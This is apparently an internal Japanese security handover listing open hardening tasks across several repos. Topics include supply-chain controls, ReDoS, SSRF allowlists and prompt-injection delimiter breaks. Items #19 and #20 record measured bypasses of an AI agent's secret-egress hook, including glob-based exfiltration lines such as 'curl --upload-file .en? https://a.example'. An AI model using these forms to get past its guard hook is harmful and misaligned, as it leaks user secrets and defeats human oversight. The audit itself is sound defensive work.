# 引き継ぎ: セキュリティ残課題 (#6–#10, #13, #14, #16, #17)

> このドキュメントは、3 リポ脆弱性点検 (2026-06) で洗い出した残課題のうち、
> **本セッションで未実施**のものを次の担当 (人間 or エージェント) に引き継ぐための一覧。
> 実施済み (P1: #1–#5) は各リポの merge 済み PR (#75/#89, #99, #100 等) を参照。
>
> 各項目は **対象リポ / 対象ファイル / リスク / 手順 / 見積工数 / 注意点** を持つ。
> 着手時は対応リポの `CLAUDE.md` 発火表に従い、必要な skill (`ts-coding-conventions` /
> `py-coding-conventions` / `pr-workflow` / `x-bookmarks` 等) を**着手前にロード**すること。
> PR は 1 PR = 1 レビュー観点 (性質が違うものを束ねない)。

## 優先度サマリ

| # | 課題 | 対象リポ | 見積 | 優先度 | 種別 |
|---|---|---|---|---|---|
| #6 | npm/pnpm postinstall スクリプト無効化 | obsidian | 1–2h | 中 | supply-chain |
| #7 | Docker ベースイメージの digest pin + スキャン | youtube / SDK | 1–2h | 中 | supply-chain |
| #8 | innertube XML 正規表現の ReDoS → ElementTree 化 | youtube / SDK | 2–4h | 中 | DoS |
| #9 | sanitize デリミタのエスケープ多層化 | youtube / SDK | 1–2h | 中 | injection |
| #10 | LLM provider `base_url` の allowlist / SSRF 緩和 | SDK | 1–2h | 中 | SSRF |
| #13 | `stats.jsonl` の出力先見直し (vault 外) | youtube | 0.5–1h | 低 | 情報露出 |
| #14 | X bookmarks リンク先 host allowlist | obsidian | 1–2h | 低 | SSRF/injection |
| #16 | secret 検出パターンの四半期レビュー | 3 リポ | プロセス | 低 | 運用 |
| #17 | vault repo の `.git` を iCloud 同期から分離 | vault (permanent-note) | 1–2h | 低 (月1回以上再発で着手) | 運用 |
| #18 | secret 検出ロジックの 4 系統ドリフト (cjs 版が旧設計のまま) | 4 リポ | 4–8h | 中 | 運用/回帰 |
| #19 | 名前照合の門の原理的迂回 → 別の防御層として設計 | 全リポ | 1d+ (設計) | 中 | 設計 |
| #20 | 免除実装の根本原因 (テキスト削除方式) の是正 | youtube / SDK | 8–12h | 中 | 回帰 |
| #21 | 防御設定のリポ単位分散 + コメントの相方不在 | 全リポ | 4–8h | 低 | 運用 |

> #18–#21 は 2026-09-03 の egress guard 調査で追加 (起草: pipeline-youtube-SDK 側セッション /
> 本リポ側の実測とレビュー: obsidian-ai-pipeline セッション)。**4 件とも「最小差分」が未確定**で、
> 現時点でコード変更提案として出せるものは無い (台帳項目としてのみ扱う)。層の被覆状況の基準線は
> 別紙 `docs/security/secret-guard-layers.md`。

---

## #6 — npm/pnpm postinstall スクリプトの無効化 (obsidian)

- **対象リポ**: `obsidian-ai-pipeline`
- **対象ファイル**: `package.json` / 新規 `.npmrc`
- **リスク**: 依存パッケージ (推移的依存を含む) の `postinstall` / `preinstall` スクリプトは
  `pnpm install` 時に**任意コードを実行**する。悪意ある or 侵害された依存が混入すると、
  `.env` / `x_tokens.json` 等の窃取を install 時に実行できる (典型的なサプライチェーン攻撃)。
- **手順**:
  1. `.npmrc` に以下を追加してデフォルトでライフサイクルスクリプトを無効化する:
     ```
     # 依存の install スクリプトを既定で無効化 (supply-chain 対策)
     enable-pre-post-scripts=false
     ```
     pnpm 10 系では `pnpm.onlyBuiltDependencies` (package.json) で
     **明示許可した依存だけ** build script を走らせる方式が推奨。
  2. **ネイティブモジュールは個別 allowlist が必要** (重要・後述の注意点):
     `better-sqlite3` / `playwright` / `@napi-rs/keyring` は install 時の
     prebuild/ダウンロードに lifecycle script を使う。package.json に:
     ```jsonc
     "pnpm": {
       "onlyBuiltDependencies": ["better-sqlite3", "@napi-rs/keyring", "esbuild"]
     }
     ```
     のように**必要なものだけ**列挙する (`playwright` はブラウザDLが別途必要なので要検証)。
  3. クリーンな環境で `rm -rf node_modules && pnpm install` → `pnpm test` /
     `pnpm typecheck` が通ることを確認。`@napi-rs/keyring` のネイティブバイナリが
     ロードされる (#1 keyring が動く) ことを実機で確認。
- **見積**: 1–2h (大半は allowlist の試行錯誤と実機検証)。
- **注意点**: `enable-pre-post-scripts=false` を**雑に入れるとネイティブ依存が壊れる**
  (better-sqlite3 の prebuild が落ちて `pnpm test` が全滅し得る)。必ず allowlist と
  セットで、クリーン install を 1 回回してから PR にすること。CI でも同じ install
  経路を使う想定。

---

## #7 — Docker ベースイメージの digest pin + 脆弱性スキャン (youtube / SDK)

- **対象リポ**: `pipeline-youtube` / `pipeline-youtube-SDK` (両方同形)
- **対象ファイル**: `docker/Dockerfile.capture` / (任意) `.github/workflows/*.yml`
- **現状**: `FROM python:3.13-slim AS base` — **タグ参照**のため、同じタグでも中身が
  差し替わる (再現性なし・侵害イメージ混入時に気付けない)。
- **リスク**: ベースイメージが侵害 / 既知 CVE を抱えたまま capture コンテナが動く。
  サプライチェーン + 既知脆弱性の二面。
- **手順**:
  1. 現行の digest を取得して pin する:
     ```dockerfile
     # python:3.13-slim を digest で固定 (再現性 + 改ざん検知)
     FROM python:3.13-slim@sha256:<digest> AS base
     ```
     digest は `docker buildx imagetools inspect python:3.13-slim` 等で取得
     (ネットワークが要るのでユーザー承認のもとで)。
  2. CI にイメージスキャンを追加 (例: `trivy image` or `docker scout cves`)。
     youtube の `.github/workflows/main.yml` には既に **pip-audit hard-fail** がある
     ので、その隣に Docker スキャン step を足す形が自然 (別 job 推奨)。
  3. digest 更新は手動 or Dependabot (`package-ecosystem: docker`) で追従。
- **見積**: 1–2h (youtube/SDK 2 リポ分。Dockerfile はほぼ同一なので 2 本目は流用)。
- **注意点**: digest を pin すると自動でセキュリティ更新が来なくなるので、
  **更新フロー (Dependabot or 定期手動)** をセットにしないと古い CVE を抱え続ける。
  PR は youtube / SDK で分けるか、同一変更なら本文で両リポ対応と明記。

---

## #8 — innertube XML 正規表現の ReDoS → ElementTree 化 (youtube / SDK)

- **対象リポ**: `pipeline-youtube` / `pipeline-youtube-SDK` (両方同形)
- **対象ファイル**: `pipeline_youtube/transcript/innertube.py`
  (`_TEXT_TAG_RE` / `_P_TAG_RE` 等, L84–91 付近)
- **現状**: timedtext XML を正規表現でパースしている:
  ```python
  _TEXT_TAG_RE = re.compile(r"<text\b([^>]*)>(.*?)</text>", re.DOTALL)
  _P_TAG_RE    = re.compile(r"<p\b([^>]*)>(.*?)</p>", re.DOTALL)
  _TAG_RE      = re.compile(r"<[^>]+>")
  ```
- **リスク**: YouTube から取得する**外部由来の XML**を正規表現で舐めるため、
  細工された巨大 / 病的な入力で **ReDoS (catastrophic backtracking)** や
  メモリ過大消費の可能性。`.*?` + `re.DOTALL` は入力長次第で危険。
- **手順**:
  1. `xml.etree.ElementTree`(標準ライブラリ) でパースし直す。timedtext は
     `<transcript><text start dur>...</text></transcript>` / srv3 は `<p t d>` 構造なので
     `ElementTree.fromstring()` → `iter("text")` / `iter("p")` で属性とテキストを取得。
  2. **XXE 対策**: 標準 `ElementTree` は外部実体を展開しないが、念のため
     `defusedxml` の採用を検討 (依存追加の是非はユーザー判断)。最小なら標準 ET で可。
  3. 既存の振る舞い (text 形を試して空なら p/srv3 形にフォールバック、L270 付近) を
     保ったままパーサだけ差し替える。`tests/` の transcript パーステストを必ず緑に。
  4. 入力サイズ上限 (`_MAX_BODY_CHARS` と同思想) を入口に設けて多層防御。
- **見積**: 2–4h (パーサ差し替え + 既存テスト維持 + 両リポ展開)。残課題で最重め。
- **注意点**: `base.py` の抽象や `video_processing.py` 呼び出し側のインタフェースを
  変えないこと (main.py thin orchestrator 不変条件)。HOW は innertube.py 内に閉じる。
  py-coding-conventions skill をロードしてから着手。

---

## #9 — sanitize デリミタのエスケープ多層化 (youtube / SDK)

- **対象リポ**: `pipeline-youtube` / `pipeline-youtube-SDK` (両方同形)
- **対象ファイル**: `pipeline_youtube/services/sanitize.py`
- **現状**: 外部テキストを `<untrusted_content>` XML デリミタで囲んで LLM に渡す
  (control/zero-width strip + delimiter wrap)。本セッションで `_emit_alert` の
  redacted stderr 化は実施済み。
- **リスク**: 入力本文に**デリミタそのもの** (`</untrusted_content>` 等) が含まれると、
  囲いを早期に閉じて後続を「信頼された指示」として注入できる (デリミタ・ブレイク)。
- **手順**:
  1. ラップ前に入力中の `<untrusted_content>` / `</untrusted_content>`
     (大文字小文字・空白ゆらぎ含む) を**無害化** (エスケープ or 不可視置換ではなく
     `&lt;.../&gt;` 風のプレースホルダ化) する。
  2. デリミタをランダムな nonce 付きにする多層化も有効:
     `<untrusted_content id="<nonce>">…</untrusted_content id="<nonce>">` で、本文側が
     nonce を知り得ないため閉じられない (obsidian の scan-threat-report L2 と同思想)。
  3. ユニットテスト: 「本文にデリミタ文字列を仕込んでも閉じない」ケースを追加。
- **見積**: 1–2h (両リポ + テスト)。
- **注意点**: obsidian 側の `scan-threat-report` skill (L2 delimiter) と**思想を揃える**
  と全体一貫性が出る。3 リポで injection 防御の語彙を散らさないこと。

---

## #10 — LLM provider `base_url` の allowlist / SSRF 緩和 (SDK)

- **対象リポ**: `pipeline-youtube-SDK`
- **対象ファイル**: `pipeline_youtube/providers/openai_compat.py` (`base_url` 注入,
  L33/L38/L43 付近) / `providers/registry.py`
- **現状**: OpenAI 互換 provider は `base_url` を設定値から受けてそのまま叩く
  (Ollama=localhost, OpenAI=api.openai.com 等)。`base_url` の値検証は無い。
- **リスク**: `base_url` が設定ファイル / 環境変数経由で外部から差し替えられる経路が
  あると、内部メタデータエンドポイント (`169.254.169.254` 等) や任意ホストへ
  API キー付きリクエストを飛ばせる **SSRF / 資格情報漏えい**の余地。
- **手順**:
  1. provider 構築時に `base_url` を検証する: スキーム (`http`/`https`)、
     既知ホスト or 明示 allowlist (`api.openai.com` / `generativelanguage.googleapis.com` /
     `localhost` / `127.0.0.1` / ユーザー設定の self-host ホスト) のみ許可。
  2. allowlist は config 値 + registry/strategy 方式 (CLAUDE.md 不変条件) で表現し、
     `if/elif` 累積にしない。
  3. metadata IP レンジ (`169.254.0.0/16` 等) は明示拒否。
  4. registry.py 側で env 解決 (`_resolve_env_vars`, #4 で未設定時 raise 済み) と
     同じ層で base_url 検証を行うと一貫。
- **見積**: 1–2h。
- **注意点**: self-host (Ollama / LM Studio) ユーザーの正規ユースケースを壊さない
  allowlist 設計にする (任意 host を config で足せる口を残す)。py-coding-conventions
  + Architecture invariant (provider 選択は registry) を遵守。

---

## #13 — `stats.jsonl` の出力先見直し (youtube)

- **対象リポ**: `pipeline-youtube`
- **対象ファイル**: `pipeline_youtube/video_processing.py` (`stats.jsonl` 書き込み箇所)
- **リスク (低)**: 実行統計 (`stats.jsonl`) の出力先が vault 内 or 想定外の場所だと、
  Obsidian に同期される / 第三者と共有される vault に**実行メタデータが混入**する
  恐れ。秘密ではないが情報露出の最小化観点。
- **手順**:
  1. 現在の出力先パスを確認 (`video_processing.py` の該当行)。vault 配下なら
     **vault 外の作業ディレクトリ** (例: XDG state dir / リポ内 `.local/`) へ移す。
  2. 出力先を config 値で上書き可能にし、デフォルトを vault 外にする。
  3. `.gitignore` に確実に入っていることを確認。
- **見積**: 0.5–1h。
- **注意点**: 既存の resume / 統計集計がこのパスを参照していないか確認
  (`resume.py` / `run_result.py` 周辺)。パス変更は後方互換に注意。

---

## #14 — X bookmarks リンク先 host allowlist (obsidian)

- **対象リポ**: `obsidian-ai-pipeline`
- **対象ファイル**: `x-bookmarks/api_client.ts` / `x-bookmarks/video_frames.ts` /
  `x-bookmarks/hands_on_generator.ts` (外部 URL を fetch / 展開する箇所)
- **リスク (低〜中)**: ブックマークに含まれる任意 URL を展開 / fetch する経路があると、
  内部ホストや metadata エンドポイントへの **SSRF**、あるいは取得本文経由の
  二次 injection の入口になり得る。
- **手順**:
  1. x-bookmarks 内で外部 URL を fetch している箇所を洗い出す (api_client / video_frames)。
  2. fetch 前に host allowlist (x.com / twimg.com / 既知 CDN 等) で検証し、
     プライベート IP レンジ / metadata IP を拒否。
  3. 取得した本文を LLM に渡す場合は #9 と同じデリミタ無害化を通す。
- **見積**: 1–2h。
- **注意点**: 着手前に `x-bookmarks` + `ts-coding-conventions` skill をロード
  (CLAUDE.md 発火表)。X API 本体 (`api.x.com`) への正規呼び出しを壊さない。

---

## #16 — secret 検出パターンの四半期レビュー (3 リポ・プロセス)

- **対象リポ**: 3 リポ横断 (コードではなく**運用プロセス**)
- **関連**: obsidian `CLAUDE.md` の「Secret-pattern の維持 (egress/gitleaks/mask 同期 — SLA)」
  節 (#5 で追加済み) の**実行**にあたる。
- **内容**: 秘密検出パターンは 4 系統に分散しているため、四半期ごとに突き合わせて
  漏れを潰す:
  - egress hook: `.claude/hooks/block-secret-egress.cjs` (obsidian) +
    `block-secret-egress.py` (youtube / SDK)
  - `.pre-commit-config.yaml` の `gitleaks` rev (youtube / SDK)
  - `ops-logging` skill の `mask()` (`capture-command.sh`)
  - `vault-ops` skill の staged secret ゲート
    (`.claude/skills/vault-ops/scripts/safe-vault-push-perm.sh` の `SECRET_ERE` —
    `block-secret-git.cjs` の `SECRET_RE` の shell 転記。ファイル名パターン系)
- **手順 (四半期ごと)**:
  1. GitHub / OpenAI / 主要クラウドが新トークン形式を出していないか確認。
  2. 4 系統の正規表現を diff し、片方にしか無いパターンを揃える (1 PR で同時更新)。
  3. `pre-commit autoupdate` で gitleaks rev を追従。
- **見積**: プロセス (1 回あたり 0.5–1h 程度)。
- **注意点**: **片方だけ更新すると検出漏れ = 対策の回帰**。必ず 1 PR で 4 系統同時に。
  次回レビュー目安: 2026-Q3。

---

## #17 — vault repo の `.git` を iCloud 同期から分離 (保留・再発条件付き)

- **対象リポ**: vault repo (obsidian-permanent-note) の**ローカル clone 運用** (コード変更なし)
- **対象ファイル**: `<vault>/.git` (実体を iCloud 外へ移動し gitdir ポインタ化)
- **リスク**: iCloud が `.git` 内部を同期し、ref 重複 (`refs/heads/main 2`) や
  オブジェクトの evict (`*.icloud` placeholder) で repo が破損する。発生頻度は
  低いが実害あり。`.githooks/pre-push` 自体が evict されると hook 不在として
  fail-open になる点もこの分離で根治する。
- **手順** (着手時の参考 — **現時点では実行しない**):
  1. `mkdir -p ~/.git-stores`
  2. `mv "$PERM_NOTE_PATH/.git" ~/.git-stores/permanent-note.git`
  3. `echo "gitdir: $HOME/.git-stores/permanent-note.git" > "$PERM_NOTE_PATH/.git"`
  4. `git -C "$PERM_NOTE_PATH" status` と `vault-push-perm` で動作確認
- **見積**: 1–2h (検証込み)
- **注意点**: **月 1 回以上の頻度で破損が再発する場合にのみ着手** (2026-07 判断)。
  現状の運用: `vault-ops` wrapper (`safe-vault-push-perm.sh`) が起動時に破損兆候
  (ref 名の空白 / packed-refs 異常 / `.git` 下の `*.icloud`) を検知して停止し、
  復旧は vault 管理ノート「iCloud による git 破損」節の確立手順で人間が行う
  (ref 削除は破壊的操作のため自動化しない)。着手前に `vault-ops` skill をロード。

---

## #18 — secret 検出ロジックの 4 系統ドリフト (4 リポ・#16 の前提事実)

- **対象リポ**: `obsidian-ai-pipeline` / `pipeline-youtube-SDK` / `pipeline-youtube` /
  `claude_openai_mcp_connector`
- **対象ファイル**: `.claude/hooks/block-secret-egress.cjs` (obsidian) /
  `.claude/hooks/block-secret-egress.py` (SDK ＝ `~/.claude/hooks/` の symlink 実体)
- **現状**: 同名の門が **2 つの異なる設計で並存**している。
  - **py 版** (ユーザ層で実効): **判定を反転した default-deny**。秘密ファイル名に当たれば、
    安全形 allowlist に `fullmatch` しない限り拒否。
  - **cjs 版** (obsidian / 全 102 行): 拒否点は **3 つ**あり性質が異なる (2e 実測):

    | # | line | 条件 | 型 |
    |---|---|---|---|
    | A | 79 | リテラル秘密 10 パターンのいずれか | 単独で拒否 |
    | B | 87 | 送信形 7 パターンのいずれか | 単独で拒否 |
    | B' | 95 | `雛形免除でない AND 秘密ファイル名 AND ネットワーク動詞` | **合致型** |

    ⇒ ⛔ **ドリフトしているのは B' だけ**であり、「cjs 全体が合致型」ではない。
    秘密ファイル名を扱う経路 (B') が py 版の default-deny 反転に追随していない。
  - さらに cjs 版の**雛形免除 (line 59) は発火しない** (2e 実測・**実行確認済み**)。
    免除条件の否定先読みが**雛形名自身に当たる**ため常に false になり、正当な雛形ファイル
    操作が誤検知される側に倒れている。
    ⭐ これは **#20 と同じ族の欠陥が cjs 版にも独立に存在する**ということ (免除をゼロ幅の
    先読みで表現したせいで区切り文字の扱いがずれる)。#20 と相互参照。
  - 参考行番号 (cjs 版): 30 リテラル秘密 / 45 送信形 (49 が curl 枝) / 56 秘密ファイル名 /
    57 ネットワーク動詞 / 59 雛形免除 / 79・87・95 が A・B・B' の拒否点。
- **リスク**: CLAUDE.md 「Secret-pattern の維持 SLA」が定める**「4 系統を 1 PR で同時更新」が
  現に破れている**。「層が無い」のではなく「**層が古い**」。cjs 版の B' は動詞を列挙しない経路
  (インタプリタ経由の読み出し等) を通す。
- **手順**:
  1. 4 系統の現行設計を 1 表にする (`docs/security/secret-guard-layers.md` が起点)。
  2. **py 版へ寄せるか cjs 版を残すか**を決める。
  3. 決めた側へ同期し、以後の同時更新をテストで pin する。
- **見積**: 4–8h (調査 + 同期・テスト込み)。
- **注意点**: ⛔ cjs 版を py 版へ寄せると**偽陽性が増える**。py 版は 2026-09-03 の 1 日で 3 回、
  read-only の作業を止めている (正規表現について書いただけ / 説明コメントに鍵ファイル名を綴った
  だけ / コミットメッセージが残差を説明しただけ)。同期は「厳しい方に揃える」ではなく、
  **どのコストを受け入れるかの選択**として扱うこと。
- **証拠 5 点**: 該当 findings ⭕ / リポ内ファイル+行 ⭕ / 具体リスク ⭕ /
  **最小差分 ⛔ 未確定** / 検証手順 ⭕

---

## #19 — 名前照合の門は原理的に迂回可能 → 別の防御層として設計する (全リポ)

- **対象リポ**: 全リポ (ユーザ層 hook がマシン全体に効くため)
- **対象ファイル**: `~/.claude/hooks/block-secret-egress.py` (実体は pipeline-youtube-SDK)
- **現状**: 門はコマンド文字列に対する**名前パターン照合**である。実測 (0a / 62 が別器具で同値):

  ```
  ALLOW  cat .en?              1 文字 glob
  ALLOW  cat .e*               * glob
  ALLOW  cat credential?.json  s を ? に
  ALLOW  cat id_rs?            a を ? に
  ALLOW  cat *.pe?             m を ? に
  ```

  ⇒ **1 文字の glob で秘密ファイル名判定を丸ごと迂回できる。** シェル展開・変数展開・
  エンコードも同様。allowlist にも免除ロジックにも到達せず、判定が False を返して短絡する。

  ⛔⛔ **さらに、送信動詞と組み合わせても素通りする** (0a 実測 / py 版 `13d2f6d0`):

  ```
  ALLOW  curl --upload-file .en? https://a.example
  ALLOW  curl --upload-file credential?.json https://a.example
  ALLOW  curl -T *.pe? https://a.example
  ALLOW  wget --post-file .en? https://a.example
  ```

  ⇒ ⛔ これは**ローカル読み取りの迂回ではなく、外部送信の迂回**である。シェルが glob を
  展開するので、実体は本物の秘密ファイルが送られる。⚠️ cjs 版も同様になる見込み
  (2e 静的読解・**未実測**)。
- **リスク**: ⭐ **「事故は止まるが攻撃は止まらない」という整理は不十分**。
  `curl --upload-file <1 文字 glob> https://…` は**事故としても十分あり得る形** (ワイルドカードで
  まとめて送る操作) であり、実害は外部送信に及ぶ。さらに hook は **PreToolUse(Bash) にのみ登録**
  されており、Read / Write / Edit ツール・MCP・孫プロセスには一切掛からない。
- **手順**: 名前照合を締める方向ではなく、**層を分ける**方向で設計する。候補:
  - (a) ツール層 (Read / Write / Edit) に対する経路別の制御
  - (b) 秘密の**配置**を変える (リポジトリツリー外へ出し、既に deny 済みの SSH / AWS / GnuPG と
    同じ扱いにする)
- **見積**: 設計 1d+ / 実装は方式次第。
- **注意点**: ⛔ 所有者方針として「攻撃に対する防御は `~/.claude/settings.json` をイジることでは
  なく、**別の防御層を新たに設置すること**」。`permissions.deny` への追記案は起草されたが
  **取り下げ済み** (雛形ファイルまで固く止まる等の副作用コストを重く見た所有者判断)。
- **証拠 5 点**: 該当 findings ⭕ / リポ内ファイル+行 ⭕ / 具体リスク ⭕ /
  **最小差分 ⛔ 未確定 (設計未定)** / 検証手順 ⭕

---

## #20 — 免除の実装が「テキスト削除」であること (根本原因 / youtube・SDK)

- **対象リポ**: `pipeline-youtube-SDK` (実体) / `pipeline-youtube` (写し)
- **対象ファイル**: `.claude/hooks/block-secret-egress.py` の `_names_a_secret_file`
- **現状**: 免除は「コマンド全文から綴りを空白 1 文字へ置換してから秘密判定を当て直す」実装。
  表現したいのは「**この match は accessor でありファイル名ではない**」という **match 単位の性質**
  だが、実装は**無関係な match の近傍を書き換えて**いる。
- **リスク**: lookahead を調整する限り、綴りを変えるたびに同族が再発する。**2026-09-03 に 2 回再発**:
  1. optional chaining 対応で lookahead に `\??` を入れた ⇒ 末尾に ` ?.x` を足すだけで回避可能。
  2. それを塞いだ後も `\s*` 枝が残り ⇒ ` ./x` / ` .bak` / ` [a-z]` で回避可能
     (⚠️ こちらは `\??` 以前から成立しており、push 済み内容にも在った)。

  さらに置換は**他の match を割る**。資格情報 JSON / サービスアカウント JSON / トークン JSON の
  3 択は文字クラスが空白をまたげないため、綴りの途中に空白が挿入されると不一致になる (62 実測)。
- **手順**: 置換をやめ、秘密判定を**原文**に当てて span を取り、その span が accessor / 雛形の
  span に**完全包含される**ものだけを捨てる。
- **見積**: 8–12h (実装 + 逆検証)。
- **注意点**: ⛔⛔ **上の手順をそのまま実装してはいけない。** span を実測した結果、正当な
  アクセサ形まで DENY になる (0a 実測):

  ```
  形              秘密 span   accessor span   包含?  → 判定
  アクセサ (ドット)  (7, 12)     (0, 11)        NO    → DENY  ⛔ 免除したい形
  アクセサ (添字)    (7, 11)     (0, 11)        yes   → ALLOW ⭕
  残差の該当名       (7, 12)     (0, 11)        NO    → DENY  ⭕ 残差が閉じる
  ```

  原因は**秘密判定側が区切り文字を消費する**のに、免除側の lookahead が**ゼロ幅**であること
  (`.` が続くときだけ 1 文字はみ出す)。選択肢は (a) start 位置だけで包含判定する
  (b) accessor span を 1 文字延ばす (c) 秘密判定側の区切りをゼロ幅にする — いずれも副作用があり、
  別途の逆検証が要る。
  ⭐ **実装より先に「アクセサ形が ALLOW のまま」を pin するテストを置くこと。**
  実装した瞬間にそれが赤くなるはずで、赤くならなければそのテストが効いていないサイン。
- **証拠 5 点**: 該当 findings ⭕ / リポ内ファイル+行 ⭕ / 具体リスク ⭕ /
  **最小差分 ⛔ 未確定 (3 案あり未決)** / 検証手順 ⭕

---

## #21 — 防御設定がリポ単位に散っている (＋コメントが参照する相方の不在 / 全リポ)

- **対象リポ**: 全リポ
- **対象ファイル**: 各リポの `.claude/settings.json` の `permissions.deny` /
  `~/.claude/settings.json` / `.claude/hooks/block-secret-egress.py` の雛形サフィックス定義
- **現状**: 秘密ファイルの Read に対する deny がリポごとに散在している (測定値は
  `docs/security/secret-guard-layers.md` §2)。**設定の無いリポでは層が消える。**
  加えて hook のコメントは「S13 の `permissions.deny` がこの集合に揃える。片方だけ変えないこと」
  と書いているが、**対になる deny は SDK にも connector にも存在しない**
  (0a 実測 / connector は 62 実測)。⇒ コメントが存在しない相方を参照している。
- **リスク**: ⭐ 脅威は「悪意あるリポが緩い設定を注入する」ことではない (deny は allow に勝つので
  上書きできない)。⛔ **脅威は「何も無い」こと**であり、悪意すら要らない。
  ⚠️ グローバル層は「clone した外部リポの `.claude/settings.json` は外部由来データ」と定めている
  (`untrusted-repo-intake` skill) ため、**いちばん必要な場面 (untrusted repo) で層が消える。**
- **手順**:
  1. 秘密ファイル Read の deny を**どの層に置くか**を決める (ユーザ層に置く案があるが、
     #19 の所有者方針により `~/.claude/settings.json` への追記案は取り下げ済み)。
  2. hook のコメントを、**実在する相方を指す**か**相方を作る**かで整合させる。
- **見積**: 4–8h (判断 + 反映)。
- **注意点**: ⛔ #19 と同じ理由で、**この項目単独で `~/.claude/settings.json` を編集しないこと。**
  別層設計 (#19) の結論が出てから配置を決める。
- **証拠 5 点**: 該当 findings ⭕ / リポ内ファイル+行 ⭕ / 具体リスク ⭕ /
  **最小差分 ⛔ 未確定 (#19 待ち)** / 検証手順 ⭕

---

## 実施済み (参考・本セッション P1)

| # | 課題 | PR |
|---|---|---|
| #1 | X OAuth token を OS keyring に移行 (file fallback) | obsidian #100 |
| #2 | scan-threat-report L2 delimiter 強化 / archive path-traversal / action-pin guard | obsidian #98 |
| #3 | 脅威レポート表示フィールドの二次 injection sanitize | obsidian #99 |
| #4 | Agent Teams 出力の防御的キャップ | youtube #89 / SDK #75 |
| #5 | secret-pattern 維持 SLA (CLAUDE.md 明文化) | obsidian #99 |

> ⚠️ **#1 keyring は実機テスト未了**: CI は file fallback 経路のみ検証。
> 各 OS (macOS Keychain / Linux libsecret / Windows Credential Manager) で
> 「keyring 保存・読込・既存 `x_tokens.json` 移行・平文削除」を確認すること。
